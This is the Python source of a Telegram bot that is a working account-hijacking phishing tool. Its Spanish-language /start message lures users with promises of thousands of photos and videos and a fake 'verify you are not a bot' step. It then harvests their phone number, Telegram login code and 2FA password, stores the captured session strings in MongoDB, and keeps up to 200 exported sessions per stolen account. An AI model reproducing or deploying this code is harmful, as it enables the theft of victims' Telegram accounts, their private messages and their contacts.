import logging
import os
import asyncio
from datetime import datetime
from telethon import functions  # Добавляем этот импорт в начале файла
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

load_dotenv()

# Конфигурация
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
mongo = MongoClient(MONGO_URI)
db = mongo.telegram_sessions
main_sessions_col = db["main_sessions"]
active_sessions_col = db["active_sessions"]

# Глобальные переменные
user_states = {}
temp_data = {}
session_tasks = {}

async def create_session_pool(user_id, phone, session_str):
    """Создаем и поддерживаем пул активных сессий"""
    try:
        # Сохраняем основную сессию
        main_sessions_col.update_one(
            {"user_id": user_id},
            {"$set": {
                "phone": phone,
                "session": session_str,
                "created_at": datetime.utcnow()
            }},
            upsert=True
        )
        
        # Запускаем фоновую задачу для поддержания сессий
        if user_id in session_tasks:
            session_tasks[user_id].cancel()
        
        session_tasks[user_id] = asyncio.create_task(
            maintain_sessions(user_id, phone, session_str)
        )
        
    except Exception as e:
        logger.error(f"Error creating session pool for {user_id}: {e}")

async def maintain_sessions(user_id, phone, main_session_str):
    """Поддерживаем 200 активных сеансов в одном аккаунте"""
    while True:
        try:
            # Используем основную сессию для управления
            main_client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH)
            await main_client.connect()
            
            if not await main_client.is_user_authorized():
                logger.error(f"Main session authorization lost for {user_id}")
                break

            try:
                # Получаем текущие активные сессии из Telegram
                auth_info = await main_client(functions.account.GetAuthorizationsRequest())
                current_sessions = auth_info.authorizations
                
                # Получаем сохраненные сессии из базы
                db_sessions = list(active_sessions_col.find({"user_id": user_id}))
                
                # Проверяем какие сессии активны
                active_hashes = {str(s.hash) for s in current_sessions if s.current}
                valid_sessions = []
                
                for session in db_sessions:
                    session_hash = session['session'].split(':')[0]
                    if session_hash in active_hashes:
                        valid_sessions.append(session)
                        # Обновляем время последней активности
                        active_sessions_col.update_one(
                            {"_id": session["_id"]},
                            {"$set": {"last_active": datetime.utcnow()}}
                        )
                    else:
                        # Удаляем неактивную сессию
                        active_sessions_col.delete_one({"_id": session["_id"]})
                
                # Создаем недостающие сессии (до 200)
                if len(valid_sessions) < 200:
                    needed = 200 - len(valid_sessions)
                    logger.info(f"Creating {needed} new sessions for {user_id}")
                    
                    for _ in range(needed):
                        try:
                            # Создаем новую сессию
                            new_client = TelegramClient(StringSession(), API_ID, API_HASH)
                            await new_client.connect()
                            
                            # Экспортируем авторизацию из основной сессии
                            exported = await main_client(functions.auth.ExportAuthorizationRequest(
                                dc_id=new_client.session.dc_id
                            ))
                            
                            # Импортируем авторизацию в новую сессию
                            await new_client(functions.auth.ImportAuthorizationRequest(
                                id=exported.id,
                                bytes=exported.bytes
                            ))
                            
                            new_session_str = new_client.session.save()
                            
                            # Сохраняем новую сессию
                            active_sessions_col.insert_one({
                                "user_id": user_id,
                                "phone": phone,
                                "session": new_session_str,
                                "created_at": datetime.utcnow(),
                                "last_active": datetime.utcnow()
                            })
                            
                        except Exception as e:
                            logger.error(f"Error creating session for {user_id}: {e}")
                        finally:
                            if 'new_client' in locals():
                                await new_client.disconnect()
            
            except Exception as e:
                logger.error(f"Error checking sessions for {user_id}: {e}")
            
            await main_client.disconnect()
            await asyncio.sleep(3600)  # Проверка каждый час
            
        except asyncio.CancelledError:
            logger.info(f"Session maintenance stopped for {user_id}")
            break
        except Exception as e:
            logger.error(f"Error in session maintenance for {user_id}: {e}")
            await asyncio.sleep(60)

async def send_code_keyboard(user_id, current_code="", message_id=None):
    """Отправляем клавиатуру для ввода кода"""
    try:
        digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
        buttons = []
        for row in digits:
            btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
            buttons.append(btn_row)
        buttons.append([InlineKeyboardButton("✅ Enviar", callback_data="code_send")])
        keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
        text = f"Código: `{current_code}`" if current_code else "Ingresa el código:"

        if message_id:
            try:
                await bot.edit_message_text(
                    chat_id=user_id,
                    message_id=message_id,
                    text=text,
                    reply_markup=keyboard,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Error editing message: {e}")
                msg = await bot.send_message(
                    user_id,
                    text,
                    reply_markup=keyboard,
                    parse_mode='Markdown'
                )
                return msg.message_id
        else:
            msg = await bot.send_message(
                user_id,
                text,
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
            return msg.message_id
    except Exception as e:
        logger.error(f"Error sending code keyboard: {e}")
        raise

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    """Обработка команды /start"""
    try:
        keyboard = InlineKeyboardMarkup().add(
            InlineKeyboardButton("Autorización en la primera cuenta🥺", callback_data="auth_account")
        )
        await message.answer(
            "👋🇪🇨 ¡HOLA! ❤️\n"
            "¿Quieres ver más de 10.000 fotos y más de 4.000 vídeos? 👁\n"
            "Verifica que no eres un bot con el botón de abajo. 🤖👇\n\n",
            reply_markup=keyboard
        )
    except Exception as e:
        logger.error(f"Error in start handler: {e}")

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    """Начало процесса авторизации"""
    try:
        user_id = callback_query.from_user.id
        user_states[user_id] = 'awaiting_contact'

        kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        kb.add(KeyboardButton("📱 Comparte tu número", request_contact=True))

        await bot.send_message(user_id, "🥺Por favor comparte tu número de teléfono:", reply_markup=kb)
        await bot.answer_callback_query(callback_query.id)
    except Exception as e:
        logger.error(f"Error in auth_account handler: {e}")

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    """Обработка номера телефона"""
    try:
        user_id = message.from_user.id
        if user_states.get(user_id) != 'awaiting_contact':
            return

        phone = message.contact.phone_number
        if not phone.startswith("+"):
            phone = "+" + phone

        # Проверяем, не авторизован ли уже этот номер
        existing = main_sessions_col.find_one({"phone": phone})
        if existing:
            await message.answer("❌ Este número ya está registrado. Usa otro número.")
            return

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            code_request = await client.send_code_request(phone)
            user_states[user_id] = 'awaiting_code'
            temp_data[user_id] = {
                'client': client,
                'phone': phone,
                'phone_code_hash': code_request.phone_code_hash,
                'message_id': None
            }
            msg_id = await send_code_keyboard(user_id)
            temp_data[user_id]['message_id'] = msg_id
        except Exception as e:
            logger.error(f"Error sending code request: {e}")
            await message.answer(f"❌ Error al enviar el código: {str(e)}")
            await client.disconnect()
            user_states.pop(user_id, None)
    except Exception as e:
        logger.error(f"Error in handle_contact: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    """Обработка ввода кода подтверждения"""
    try:
        user_id = callback_query.from_user.id
        data = callback_query.data

        if user_states.get(user_id) != 'awaiting_code':
            await bot.answer_callback_query(callback_query.id, text="⛔️ No es el momento adecuado", show_alert=True)
            return

        user_data = temp_data.get(user_id)
        if not user_data:
            await bot.answer_callback_query(callback_query.id, text="Error de sesión", show_alert=True)
            return

        current_code = user_data.get('code', '')
        message_id = user_data.get('message_id')

        if data == "code_send":
            if not current_code:
                await bot.answer_callback_query(callback_query.id, text="⚠️ Ingresa el código primero", show_alert=True)
                return
            
            await bot.answer_callback_query(callback_query.id)
            await try_sign_in(user_id, current_code)
        else:
            digit = data.split("_")[1]
            if len(current_code) >= 10:
                await bot.answer_callback_query(callback_query.id, text="⚠️ Código demasiado largo", show_alert=True)
                return
            
            current_code += digit
            temp_data[user_id]['code'] = current_code
            await send_code_keyboard(user_id, current_code, message_id)
            await bot.answer_callback_query(callback_query.id)
    except Exception as e:
        logger.error(f"Error in process_code_button: {e}")

async def try_sign_in(user_id, code):
    """Попытка входа с кодом подтверждения"""
    try:
        user_data = temp_data.get(user_id)
        if not user_data:
            await bot.send_message(user_id, "⚠️ Sesión no encontrada. Por favor, comienza de nuevo con /start")
            return

        client = user_data['client']
        phone = user_data['phone']
        phone_code_hash = user_data['phone_code_hash']

        try:
            # Пробуем войти с кодом
            await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            if await client.is_user_authorized():
                session_str = client.session.save()
                await create_session_pool(user_id, phone, session_str)
                
                await bot.send_message(user_id, "✅ ¡Autenticación exitosa!")
                await bot.send_message(
                    user_id,
                    "Estamos trabajando en modo manual, disculpen la demora, "
                    "pronto les enviaremos material fotográfico y de video😉🧍‍♀️."
                )
            else:
                user_states[user_id] = 'awaiting_2fa'
                await bot.send_message(user_id, "🔐 Ingresa tu contraseña 2FA:")
                
        except SessionPasswordNeededError:
            user_states[user_id] = 'awaiting_2fa'
            await bot.send_message(user_id, "🔐 Se requiere tu contraseña 2FA. Por favor, ingrésala:")
        except PhoneCodeInvalidError:
            await bot.send_message(user_id, "❌ Código incorrecto. Inténtalo de nuevo:")
            temp_data[user_id]['code'] = ""
            await send_code_keyboard(user_id, "", temp_data[user_id]['message_id'])
        except PhoneCodeExpiredError:
            await bot.send_message(user_id, "⏰ Código expirado. Por favor, intenta nuevamente con /start")
            await client.disconnect()
            cleanup(user_id)
        except Exception as e:
            logger.error(f"Sign in error: {e}")
            await bot.send_message(user_id, f"❌ Error de autenticación: {str(e)}")
            await client.disconnect()
            cleanup(user_id)
    except Exception as e:
        logger.error(f"Error in try_sign_in: {e}")

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    """Обработка двухфакторной аутентификации"""
    try:
        user_id = message.from_user.id
        password = message.text.strip()
        user_data = temp_data.get(user_id)
        
        if not user_data:
            await message.answer("⚠️ Sesión no encontrada. Por favor, comienza de nuevo con /start")
            return

        client = user_data['client']
        phone = user_data['phone']

        try:
            await client.sign_in(password=password)
            
            if await client.is_user_authorized():
                session_str = client.session.save()
                await create_session_pool(user_id, phone, session_str)
                
                await message.answer("✅ ¡Autenticación exitosa con 2FA!")
                await message.answer(
                    "Estamos trabajando en modo manual, disculpen la demora, "
                    "pronto les enviaremos material fotográfico y de video😉🧍‍♀️."
                )
            else:
                await message.answer("❌ No se pudo autenticar con 2FA.")
        except Exception as e:
            logger.error(f"2FA error: {e}")
            await message.answer(f"❌ Error con 2FA: {str(e)}")
        finally:
            await client.disconnect()
            cleanup(user_id)
    except Exception as e:
        logger.error(f"Error in process_2fa: {e}")

def cleanup(user_id):
    """Очистка данных пользователя"""
    try:
        if user_id in user_states:
            user_states.pop(user_id)
        if user_id in temp_data:
            temp_data.pop(user_id)
    except Exception as e:
        logger.error(f"Error in cleanup: {e}")

async def on_startup(dp):
    """Действия при запуске бота"""
    logger.info("Bot started")
    # Убедимся, что нет старых задач
    for task in session_tasks.values():
        task.cancel()
    session_tasks.clear()

async def on_shutdown(dp):
    """Действия при остановке бота"""
    logger.info("Shutting down...")
    # Отменяем все фоновые задачи
    for task in session_tasks.values():
        task.cancel()
    # Закрываем соединения
    await dp.storage.close()
    await dp.storage.wait_closed()
    await bot.close()

if __name__ == '__main__':
    try:
        executor.start_polling(
            dp,
            skip_updates=True,
            on_startup=on_startup,
            on_shutdown=on_shutdown,
            timeout=60,
            relax=1
        )
    except Exception as e:
        logger.error(f"Fatal error: {e}")